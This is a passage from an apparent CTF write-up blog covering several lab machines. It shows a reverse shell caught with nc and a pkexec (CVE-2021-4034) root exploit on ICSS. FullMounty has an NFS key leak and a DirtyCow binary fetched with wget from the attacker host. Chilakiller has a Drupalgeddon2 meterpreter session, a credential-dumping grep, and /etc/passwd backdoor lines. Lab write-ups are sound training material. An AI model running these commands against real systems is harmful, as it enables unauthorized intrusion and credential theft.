[1/1] :: 181 req/sec :: Duration: [0:00:04] :: Errors: 0 ::```{: .nolineno}Now lets access them â†’![Untitled](/Vulnhub-Files/img/ICSS_team_CTF/Untitled%202.png)Now I used this path in index.php LFI and I got another information â†’![Untitled](/Vulnhub-Files/img/ICSS_team_CTF/Untitled%203.png)Lets try another bruteforce , now for command injection parameter search â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/ICSS]â””â”€$ ffuf -c -mc 200,301,302,401 -fc 404,500,401 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://10.0.2.65/index.php?file=ICSSteamshell.php&FUZZ=id' -fs 697 -o ffuf_CI_parameter /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ 'v2.0.0-dev________________________________________________ :: Method : GET :: URL : http://10.0.2.65/index.php?file=ICSSteamshell.php&FUZZ=id :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt :: Output file : ffuf_CI_parameter :: File format : json :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,301,302,401 :: Filter : Response status: 404,500,401 :: Filter : Response size: 697________________________________________________file [Status: 200, Size: 667, Words: 205, Lines: 30, Duration: 1ms]tweak [Status: 200, Size: 804, Words: 209, Lines: 35, Duration: 44ms]:: Progress: [4723/4723] :: Job [1/1] :: 312 req/sec :: Duration: [0:00:04] :: Errors: 0 ::```{: .nolineno}Now with tweak I got a hit into the system â†’![Untitled](/Vulnhub-Files/img/ICSS_team_CTF/Untitled%204.png)Now lets get a shell now â†’![Untitled](/Vulnhub-Files/img/ICSS_team_CTF/Untitled%205.png)In response I got the shell â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/ICSS]â””â”€$ nc -lvnp 4444 listening on [any] 4444 ...connect to [10.0.2.60] from (UNKNOWN) [10.0.2.65] 37532/bin/sh: 0: cant access tty; job control turned off$ python -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@ICSSteam:/var/www/html$ whoamiwhoamiwww-datawww-data@ICSSteam:/var/www/html$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data)www-data@ICSSteam:/var/www/html$```{: .nolineno}Now I checked the SUIDs and I got some data like `psexec` file â†’```bashwww-data@ICSSteam:/tmp$ find / -perm -u=s -type f 2>/dev/null/bin/mount/bin/umount/bin/ping/bin/su/bin/fusermount/bin/ping6/usr/bin/at/usr/bin/newuidmap/usr/bin/sudo/usr/bin/chsh/usr/bin/pkexec/usr/bin/passwd/usr/bin/newgidmap/usr/bin/chfn/usr/bin/newgrp/usr/bin/gpasswd/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic/usr/lib/snapd/snap-confine/usr/lib/eject/dmcrypt-get-device/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helper/home/darkxploiter/checkwww-data@ICSSteam:/tmp$```{: .nolineno}I checked its version and it was vulnerable so I exploited it â†’```bashwww-data@ICSSteam:/home/darkxploiter$ pkexec --versionpkexec version 0.105```{: .nolineno}I found this exploit â†’ [Exploit](https://github.com/mebeim/CVE-2021-4034)I followed the steps , transfered all the exploit files into the victim machine and got root â†’```bashwww-data@ICSSteam:/tmp$ ./exploit.sh Pwned!# /bin/bash -iroot@ICSSteam:/tmp# whoamirootroot@ICSSteam:/tmp# iduid=0(root) gid=0(root) groups=0(root),33(www-data)root@ICSSteam:/tmp# cd /rootroot@ICSSteam:/root# ls -altotal 44drwx------ 4 root root 4096 Mar 5 2023 .drwxr-xr-x 25 root root 4096 Feb 20 2023 ..-rw------- 1 root root 2248 Mar 5 2023 .bash_history-rw-r--r-- 1 root root 3106 Oct 22 2015 .bashrcdrwx------ 2 root root 4096 Feb 8 2023 .cachedrwxr-xr-x 2 root root 4096 Feb 9 2023 .nano-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rw------- 1 root root 139 Mar 5 2023 root.txt-rwxr-xr-x 1 root root 8824 Mar 5 2023 solveroot@ICSSteam:/root# cat root.txtTo get the root flag you have execute the solve.But only after being the actual root of this system otherwise you will not get the flag.root@ICSSteam:/root# echo \"shiv:`openssl passwd root`:0:0:root:/root:/bin/bash\" >> /etc/passwdroot@ICSSteam:/root# su shivroot@ICSSteam:~# ./solve4996cb979f225ba0581190fbcf3bdf5f -root@ICSSteam:~#```{: .nolineno}I also got user.txt file â†’```bashroot@ICSSteam:/home/icss# cat user.txt7e902d2cf294d4909690936388b64cd5 -root@ICSSteam:/home/icss#```{: .nolineno}Now I can access anything !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Fullmounty", "url": "/posts/FullMounty/", "categories": "PwnTillDawn", "tags": "Kernel Exploit, DirtyCow, NFS", "date": "2023-09-24 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.134]â””â”€$ cat Nmap_results.txt # Nmap 7.94 scan initiated Sun Aug 20 22:14:12 2023 as: nmap -sC -sV -p- -T4 -oN Nmap_r...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.134]â””â”€$ cat Nmap_results.txt # Nmap 7.94 scan initiated Sun Aug 20 22:14:12 2023 as: nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.150.150.134Nmap scan report for 10.150.150.134Host is up (0.15s latency).Not shown: 65528 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 5.3p1 Debian 3ubuntu7.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 1024 f6:e9:3f:cf:88:ec:7c:35:63:91:34:aa:14:55:49:cc (DSA)|_ 2048 20:1d:e9:90:6f:4b:82:a3:71:1e:a9:99:95:7f:31:ea (RSA)111/tcp open rpcbind 2 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2 111/tcp rpcbind| 100000 2 111/udp rpcbind| 100003 2,3,4 2049/tcp nfs| 100003 2,3,4 2049/udp nfs| 100005 1,2,3 34154/tcp mountd| 100005 1,2,3 50354/udp mountd| 100021 1,3,4 45783/tcp nlockmgr| 100021 1,3,4 48262/udp nlockmgr| 100024 1 38840/udp status|_ 100024 1 40110/tcp status2049/tcp open nfs 2-4 (RPC #100003)8089/tcp open ssl/http Splunkd httpd|_http-title: splunkd| http-robots.txt: 1 disallowed entry |_/| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser| Not valid before: 2019-10-28T09:51:59|_Not valid after: 2022-10-27T09:51:59|_http-server-header: Splunkd34154/tcp open mountd 1-3 (RPC #100005)40110/tcp open status 1 (RPC #100024)45783/tcp open nlockmgr 1-4 (RPC #100021)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## NFS Shares Enumeration â¤µï¸Now I have access to nfs so lets see its shared shares through `showmount` command â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.134]â””â”€$ showmount -e 10.150.150.134Export list for 10.150.150.134:/srv/exportnfs 10.0.0.0/8```{: .nolineno}Now lets mount this directory in out local system through `mount` command â¤µï¸ ```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.134]â””â”€$ mkdir /tmp/nfs â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.134]â””â”€$ sudo mount -v -t nfs -o vers=3,proto=tcp,nolock 10.150.150.134:/srv/exportnfs /tmp/nfs[sudo] password for kali: mount.nfs: timeout set for Mon Sep 18 22:25:38 2023mount.nfs: trying text-based options 'vers=3,proto=tcp,nolock,addr=10.150.150.134'mount.nfs: prog 100003, trying vers=3, prot=6mount.nfs: trying 10.150.150.134 prog 100003 vers 3 prot TCP port 2049mount.nfs: prog 100005, trying vers=3, prot=6mount.nfs: trying 10.150.150.134 prog 100005 vers 3 prot TCP port 34154```{: .nolineno}Now lets check if it gets mounted or not with `df` command â†’![Untitled](/Vulnhub-Files/img/FullMounty/Untitled%201.png)Now lets see inside this shares â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.134]â””â”€$ cd /tmp/nfs â”Œâ”€â”€(kaliã‰¿kali)-[/tmp/nfs]â””â”€$ ls -altotal 36drwxr-xr-x 5 nobody nogroup 4096 Oct 29 2019 .drwxrwxrwt 27 root root 4096 Sep 18 22:23 ..-rw------- 1 nobody nogroup 667 Oct 29 2019 .bash_historydrwxr-xr-x 5 nobody nogroup 4096 Oct 29 2019 .config-rw-r--r-- 1 kali kali 41 Oct 22 2019 FLAG49-rw-r--r-- 1 kali kali 1675 Oct 3 2019 id_rsa-rw-r--r-- 1 kali kali 397 Oct 3 2019 id_rsa.pubdrwxr-xr-x 3 nobody nogroup 4096 Oct 29 2019 .localdrwxr-xr-x 3 nobody nogroup 4096 Oct 29 2019 .mozilla â”Œâ”€â”€(kaliã‰¿kali)-[/tmp/nfs]â””â”€$ cat FLAG49 41b779ac4c999468ba7f862cde86412096d1c37b```{: .nolineno}Now I got the id_rsa private key so lets try to SSH into the system â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.134]â””â”€$ ssh deadbeef@10.150.150.134 -i id_rsaLinux FullMounty 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/LinuxUbuntu 10.04.4 LTSWelcome to Ubuntu! * Documentation: https://help.ubuntu.com/New release 'precise' available.Run 'do-release-upgrade' to upgrade to it.Last login: Wed Aug 12 00:50:59 2020deadbeef@FullMounty:~$ whoamideadbeefdeadbeef@FullMounty:~$ iduid=1000(deadbeef) gid=1000(deadbeef) groups=4(adm),20(dialout),24(cdrom),46(plugdev),107(lpadmin),108(sambashare),109(admin),1000(deadbeef)deadbeef@FullMounty:~$```{: .nolineno}Now lets dig deeper into the shell for root access , and for that I directly checked the kernel version so I got this â†’```bashdeadbeef@FullMounty:/$ uname -anLinux FullMounty 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linuxdeadbeef@FullMounty:/$```{: .nolineno}Since it is very old Linux machine so lets use the exploit named as dirtycow over here I have the pre-compiled file of it for both architecture of machine x32 and x64 so lets use x32 over here â¤µï¸ ```bashdeadbeef@FullMounty:/tmp$ wget http://10.66.66.178:2323/exploit_32--2023-09-18 11:18:01-- http://10.66.66.178:2323/exploit_32Connecting to 10.66.66.178:2323... connected.HTTP request sent, awaiting response... 200 OKLength: 12768 (12K) [application/octet-stream]Saving to: `exploit_32100%[=====================>] 12,768 65.4K/s in 0.2s 2023-09-18 11:18:01 (65.4 KB/s) - `exploit_32 saved [12768/12768]deadbeef@FullMounty:/tmp$deadbeef@FullMounty:/tmp$ ./exploit_32/etc/passwd successfully backed up to /tmp/passwd.bakPlease enter the new password: Complete line:evait:fiw.I6FqpfXW.:0:0:pwned:/root:/bin/bashmmap: b784b000madvise 0ptrace 0Done! Check /etc/passwd to see if the new user was createdYou can log in with username evait and password root.DONT FORGET TO RESTORE /etc/passwd FROM /tmp/passwd.bak !!!Done! Check /etc/passwd to see if the new user was createdYou can log in with username evait and password root.DONT FORGET TO RESTORE /etc/passwd FROM /tmp/passwd.bak !!!deadbeef@FullMounty:/tmp$ su firefartUnknown id: firefartdeadbeef@FullMounty:/tmp$ su evaitPassword: evait@FullMounty:/tmp# whoamievaitevait@FullMounty:/tmp#evait@FullMounty:/tmp# cd /rootevait@FullMounty:~# iduid=0(evait) gid=0(root) groups=0(root)evait@FullMounty:~# ls -altotal 28drwx------ 4 evait root 4096 2019-10-03 07:34 .drwxr-xr-x 22 evait root 4096 2019-10-03 00:10 ..drwx------ 2 evait root 4096 2019-10-03 00:10 .aptitude-rw------- 1 evait root 150 2020-08-12 02:00 .bash_history-rw-r--r-- 1 evait root 3106 2010-04-23 02:45 .bashrcdrwxr-xr-x 2 evait root 4096 2019-10-03 00:10 .debtags-rw-r--r-- 1 evait root 140 2010-04-23 02:45 .profileevait@FullMounty:~#```{: .nolineno}Now I am root !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "ElMariachi-PC", "url": "/posts/ElMariachi-PC/", "categories": "PwnTillDawn", "tags": "Public Exploit, PrivEsc", "date": "2023-09-24 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.69]â””â”€$ sudo nmap -sV -sC -p- -A -T4 -oN Nmap_results.txt 10.150.150.69Nmap scan report for 10.150.150.69Host is up (...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.69]â””â”€$ sudo nmap -sV -sC -p- -A -T4 -oN Nmap_results.txt 10.150.150.69Nmap scan report for 10.150.150.69Host is up (0.17s latency).Not shown: 65521 closed tcp ports (reset)PORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?3389/tcp open ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info: | Target_Name: ELMARIACHI-PC| NetBIOS_Domain_Name: ELMARIACHI-PC| NetBIOS_Computer_Name: ELMARIACHI-PC| DNS_Domain_Name: ElMariachi-PC| DNS_Computer_Name: ElMariachi-PC| Product_Version: 10.0.17763|_ System_Time: 2023-08-09T17:48:28+00:00| ssl-cert: Subject: commonName=ElMariachi-PC| Not valid before: 2023-08-08T14:37:18|_Not valid after: 2024-02-07T14:37:18|_ssl-date: 2023-08-09T17:48:58+00:00; +35m42s from scanner time.5040/tcp open unknown49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49669/tcp open msrpc Microsoft Windows RPC49670/tcp open msrpc Microsoft Windows RPC50417/tcp open msrpc Microsoft Windows RPC60000/tcp open unknown| fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 404 Not Found| Content-Type: text/html| Content-Length: 177| Connection: Keep-Alive| 404 Not Found404 Not FoundThe requested URL nice%20ports%2C/Tri%6Eity.txt%2ebak was not found on this server.| GetRequest: | HTTP/1.1 401 Access Denied| Content-Type: text/html| Content-Length: 144| Connection: Keep-Alive| WWW-Authenticate: Digest realm=\"ThinVNC\", qop=\"auth\", nonce=\"gJ6QWW4L5kBI2UcCbgvmQA==\", opaque=\"dQwMTtxk2a2YM2Qf4DoI35O5R0L08eFaCP\"|_ 401 Access Denied401 Access DeniedThe requested URL requires authorization.1 service unrecognized despite returning data. If you know the service/version```{: .nolineno}## Web Enumeration â¤µï¸Now lets check port 60000 for HTTP access â†’It asking for username and password so when I observed the nmap scan I got ThinVNC , Lets find an exploit related to it â†’I got this exploit â†’ [https://www.exploit-db.com/exploits/47519](https://www.exploit-db.com/exploits/47519)Since It throws an error so I implemented on Burpsuite Directly â†’![Untitled](/Vulnhub-Files/img/ElMariachi-PC/Untitled%201.png)![Untitled](/Vulnhub-Files/img/ElMariachi-PC/Untitled%202.png)I got some credentails â†’```bashUser=desperadoPassword=TooComplicatedToGuessMeAhahahahahahahh```{: .nolineno}No lets use this password as a login into the web â†’![Untitled](/Vulnhub-Files/img/ElMariachi-PC/Untitled%203.png)Now When I entered â€˜Windowsâ€™ in the Text Box and the Web OS open up and there I found the FLAG â†’![Untitled](/Vulnhub-Files/img/ElMariachi-PC/Untitled%204.png)```bash2971f3459fe55db1237aad5e0f0a259a41633962```{: .nolineno}Hence the machine is in Attackers control can have a reverse shell though execution of revrese shell code through web OS to Attckerâ€™s machine but no need .> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Chilakiller", "url": "/posts/Chilakiller/", "categories": "PwnTillDawn", "tags": "Drupal, Hid&Trial, .config, Metasploit", "date": "2023-09-24 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.182]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.150.150.182[sudo] password for kali: Starting Nmap 7.94 ( ...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.182]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.150.150.182[sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-19 15:07 ISTStats: 0:03:16 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth ScanSYN Stealth Scan Timing: About 13.11% done; ETC: 15:32 (0:21:46 remaining)Nmap scan report for 10.150.150.182Host is up (0.21s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)| ssh-hostkey: | 2048 8e:0a:83:30:6b:a5:ef:12:81:4a:8e:66:c6:f4:22:12 (RSA)| 256 ef:77:5e:a9:59:19:de:f8:c3:f3:1c:2e:73:09:8a:8f (ECDSA)|_ 256 b3:be:3b:05:0c:f7:62:24:ce:1b:5c:5b:df:cc:fc:23 (ED25519)80/tcp open http nginx 1.4.0 (Ubuntu)|_http-title: Welcome to nginx!|_http-server-header: nginx 1.4.0 (Ubuntu)| fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK| Date: Tue, 19 Sep 2023 10:30:36 GMT| Server: nginx 1.4.0 (Ubuntu)| Last-Modified: Sat, 01 Aug 2020 20:47:30 GMT| ETag: \"264-5abd7039b3849\"| Accept-Ranges: bytes| Content-Length: 612| Vary: Accept-Encoding| Connection: close| Content-Type: text/html| | | | Welcome to nginx!| | | | Welcome to nginx!| If you see this page, the nginx web server is successfully installed and| working. Further configuration is required.| For online documentation and support please refer to| href=\"http://nginx.org/\">nginx.org.| Commercial support is available at| href=\"http://nginx.com/\">nginx.com.| Thank you for using nginx.| | | HTTPOptions: | HTTP/1.1 200 OK| Date: Tue, 19 Sep 2023 10:30:36 GMT| Server: nginx 1.4.0 (Ubuntu)| Allow: HEAD,HEAD,GET,HEAD,POST,OPTIONS| Content-Length: 0| Connection: close| Content-Type: text/html| RTSPRequest: | HTTP/1.1 400 Bad Request| Date: Tue, 19 Sep 2023 10:30:37 GMT| Server: nginx 1.4.0 (Ubuntu)| Content-Length: 299| Connection: close| Content-Type: text/html; charset=iso-8859-1| | | 400 Bad Request| | Bad Request| Your browser sent a request that this server could not understand.| | | nginx 1.4.0 (Ubuntu) Server at 127.0.1.1 Port 80|_ 8080/tcp open http-proxy nginx 1.4.0 (Ubuntu)|_http-server-header: nginx 1.4.0 (Ubuntu)|_http-open-proxy: Proxy might be redirecting requests|_http-title: Welcome to nginx!| fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK| Date: Tue, 19 Sep 2023 10:30:36 GMT| Server: nginx 1.4.0 (Ubuntu)| Last-Modified: Sat, 01 Aug 2020 20:47:30 GMT| ETag: \"264-5abd7039b3849\"| Accept-Ranges: bytes| Content-Length: 612| Vary: Accept-Encoding| Connection: close| Content-Type: text/html| | | | Welcome to nginx!| | | | Welcome to nginx!| If you see this page, the nginx web server is successfully installed and| working. Further configuration is required.| For online documentation and support please refer to| href=\"http://nginx.org/\">nginx.org.| Commercial support is available at| href=\"http://nginx.com/\">nginx.com.| Thank you for using nginx.| | | HTTPOptions: | HTTP/1.1 200 OK| Date: Tue, 19 Sep 2023 10:30:36 GMT| Server: nginx 1.4.0 (Ubuntu)| Allow: HEAD,HEAD,GET,HEAD,POST,OPTIONS| Content-Length: 0| Connection: close| Content-Type: text/html| RTSPRequest: | HTTP/1.1 400 Bad Request| Date: Tue, 19 Sep 2023 10:30:37 GMT| Server: nginx 1.4.0 (Ubuntu)| Content-Length: 299| Connection: close| Content-Type: text/html; charset=iso-8859-1| | | 400 Bad Request| | Bad Request| Your browser sent a request that this server could not understand.| | | nginx 1.4.0 (Ubuntu) Server at 127.0.1.1 Port 80|_ 2 services unrecognized despite returning data.```{: .nolineno}## Web Enumeration â¤µï¸Lets check port 80 â†’![Untitled](/Vulnhub-Files/img/Chilakiller/Untitled%201.png)I got a nginx server runing so lets now see the directory or files bruteforcing , first I couldnâ€™t find anything than with different wordlists I got a hit and got a drupal site â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.182]â””â”€$ feroxbuster -u http://10.150.150.182:80/ -w /usr/share/wordlists/dirb/big.txt -t 100 -x php,zip,log,txt -C 404,403,500 -o Ferox_80 --depth 1 ___ ___ __ __ __ __ __ ___|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___by Ben \"epi\" Risher ðŸ¤“ ver: 2.10.0â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸŽ¯ Target Url â”‚ http://10.150.150.182:80/ ðŸš€ Threads â”‚ 100 ðŸ“– Wordlist â”‚ /usr/share/wordlists/dirb/big.txt ðŸ’¢ Status Code Filters â”‚ [404, 403, 500] ðŸ’¥ Timeout (secs) â”‚ 7 ðŸ¦¡ User-Agent â”‚ feroxbuster/2.10.0 ðŸ’‰ Config File â”‚ /etc/feroxbuster/ferox-config.toml ðŸ”Ž Extract Links â”‚ true ðŸ’¾ Output File â”‚ Ferox_80 ðŸ’² Extensions â”‚ [php, zip, log, txt] ðŸ HTTP methods â”‚ [GET] ðŸ”ƒ Recursion Depth â”‚ 1â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ Press [ENTER] to use the Scan Management Menuâ„¢â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€403 GET 9l 29w 277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter404 GET 9l 32w 274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter200 GET 25l 69w 612c http://10.150.150.182/301 GET 9l 29w 316c http://10.150.150.182/SiteMap => http://10.150.150.182/SiteMap/301 GET 9l 29w 314c http://10.150.150.182/Sites => http://10.150.150.182/Sites/301 GET 9l 29w 313c http://10.150.150.182/TEMP => http://10.150.150.182/TEMP/301 GET 9l 29w 315c http://10.150.150.182/manual => http://10.150.150.182/manual/301 GET 9l 29w 320c http://10.150.150.182/restaurante => http://10.150.150.182/restaurante/301 GET 9l 29w 318c http://10.150.150.182/test-site => http://10.150.150.182/test-site/[####################] - 7m 204750/204750 0s found:7 errors:1316 [####################] - 7m 102345/102345 253/s http://10.150.150.182:80/ [####################] - 7m 102345/102345 254/s http://10.150.150.182/```{: .nolineno}Now in directory `/restaurante/` I got a drupal site â†’![Untitled](/Vulnhub-Files/img/Chilakiller/Untitled%202.png)Now I used the metasploit module for exploitation of drupal sites â†’```bashmsf6 exploit(unix/webapp/drupal_drupalgeddon2) > optionsModule options (exploit/unix/webapp/drupal_drupalgeddon2): Name Current Setting Required Description ---- --------------- -------- ----------- DUMP_OUTPUT false no Dump payload command output PHP_FUNC passthru yes PHP function to execute Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.150.150.182 yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/us ing-metasploit.html RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI /restaurante/ yes Path to Drupal install subdomain no HTTP server virtual hostPayload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.66.66.178 yes The listen address (an interface may be specified) LPORT 4444 yes The listen portExploit target: Id Name -- ---- 0 Automatic (PHP In-Memory)View the full module info with the info, or info -d command.msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run[*] Started reverse TCP handler on 10.66.66.178:4444 [*] Running automatic check (\"set AutoCheck false\" to disable)[+] The target is vulnerable.[*] Sending stage (39927 bytes) to 10.150.150.182[*] Meterpreter session 1 opened (10.66.66.178:4444 -> 10.150.150.182:58574) at 2023-09-19 16:16:12 +0530meterpreter > meterpreter > shellProcess 5624 created.Channel 0 created.python3 -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@chilakiller:/var/www/html/restaurante$```{: .nolineno}Now lets dig deeper into the shell and get come credentials and for that I used this script â†’```bashfind / -name settings.php -exec grep \"drupal_hash_salt\\|'database'\\|'username'\\|'password'\\|'host'\\|'port'\\|'driver'\\|'prefix'\" {} \\; 2>/dev/null```{: .nolineno}I got this result â¤µï¸ ```bash* 'driver' => 'mysql', * 'database' => 'databasename', * 'username' => 'username', * 'password' => 'password', * 'host' => 'localhost', * 'port' => 3306, * 'prefix' => 'myprefix_', * 'driver' => 'mysql', * 'database' => 'databasename', * 'username' => 'username', * 'password' => 'password', * 'host' => 'localhost', * 'prefix' => 'main_', * 'driver' => 'mysql', * 'database' => 'databasename', * 'username' => 'username', * 'password' => 'password', * 'host' => 'localhost', * by using the 'prefix' setting. If a prefix is specified, the table * To have all database names prefixed, set 'prefix' as a string: * 'prefix' => 'main_', * To provide prefixes for specific tables, set 'prefix' as an array. * 'prefix' => array( * 'prefix' => array( * 'driver' => 'mysql', * 'database' => 'databasename', * 'username' => 'username', * 'password' => 'password', * 'host' => 'localhost', * 'prefix' => '', * 'driver' => 'pgsql', * 'database' => 'databasename', * 'username' => 'username', * 'password' => 'password', * 'host' => 'localhost', * 'prefix' => '', * 'driver' => 'sqlite', * 'database' => '/path/to/databasefilename', 'database' => 'drupaldb', 'username' => 'drupal', 'password' => 'EstaContraNoesTanImp0rtant3!!!', 'host' => 'localhost', 'port' => '', 'driver' => 'mysql', 'prefix' => 'ptd_', * $drupal_hash_salt = file_get_contents('/home/example/salt.txt');$drupal_hash_salt = 'EWlZLEj4s5rioclU2dTcU-_G1lMvzhVef2wm8NB0Fvk';```{: .nolineno}Now I see a users on home directory â†’```bashwww-data@chilakiller:/$ cd homewww-data@chilakiller:/home$ ls -altotal 12drwxr-xr-x 3 root root 4096 Jul 31 2020 .drwxr-xr-x 23 root root 4096 Jul 31 2020 ..drwxr-x--- 11 user1 user1 4096 Sep 30 2021 user1www-data@chilakiller:/home$```{: .nolineno}Now I just hid and tried the user & password as same that is `user1:user1` and I got in ,I was stuck for some time for that â†’```bashwww-data@chilakiller:/home$ su user1Password: user1@chilakiller:/home$ cd user1user1@chilakiller:~$ ls -altotal 68drwxr-x--- 11 user1 user1 4096 Sep 30 2021 .drwxr-xr-x 3 root root 4096 Jul 31 2020 ..lrwxrwxrwx 1 user1 user1 9 Jul 31 2020 .bash_history -> /dev/null-rw-r--r-- 1 user1 user1 220 Jul 31 2020 .bash_logout-rw-r--r-- 1 user1 user1 3688 Aug 1 2020 .bashrcdrwx------ 12 user1 user1 4096 Apr 28 2021 .cachedrwx------ 13 user1 user1 4096 Aug 1 2020 .configdrwxr-xr-x 2 user1 user1 4096 Jul 31 2020 Desktopdrwxr-xr-x 2 user1 user1 4096 Aug 1 2020 Documents-rw------- 1 user1 user1 41 Aug 4 2020 FLAG3.txtdrwx------ 3 user1 user1 4096 Jul 31 2020 .gnupg-rw------- 1 user1 user1 7022 Sep 30 2021 .ICEauthoritydrwxr-xr-x 3 user1 user1 4096 Jul 31 2020 .localdrwx------ 5 user1 user1 4096 Aug 4 2020 .mozilladrwx------ 3 user1 user1 4096 Aug 1 2020 .pki-rw-r--r-- 1 user1 user1 675 Jul 31 2020 .profiledrwx------ 2 user1 user1 4096 Aug 1 2020 .sshuser1@chilakiller:~$ cat FLAG3.txt 9a8cda5f343e89e68aaec65f1df3c61ae5176a19user1@chilakiller:~$```{: .nolineno}Now for root access I searched for `.conf` files and I got these and the credentials for root â†’```bashuser1@chilakiller:~$ find / -name \".conf*\" 2>/dev/null/etc/openvpn/client/.config/home/user1/.config/var/lib/gdm3/.configuser1@chilakiller:~$ cat /etc/openvpn/client/.configcat: /etc/openvpn/client/.config: Is a directoryuser1@chilakiller:~$ cd /etc/openvpn/client/.configuser1@chilakiller:/etc/openvpn/client/.config$ ls -altotal 12drwxr-xr-x 2 root root 4096 Aug 1 2020 .drwxr-xr-x 3 root root 4096 Aug 1 2020 ..-rw-r----- 1 root ch 29 Aug 1 2020 .5OBdDQ80Pyuser1@chilakiller:/etc/openvpn/client/.config$ cat .5OBdDQ80Py hUqJ2ChilaKill3s_Tru3_L0v3Ruser1@chilakiller:/etc/openvpn/client/.config$ su rootPassword: 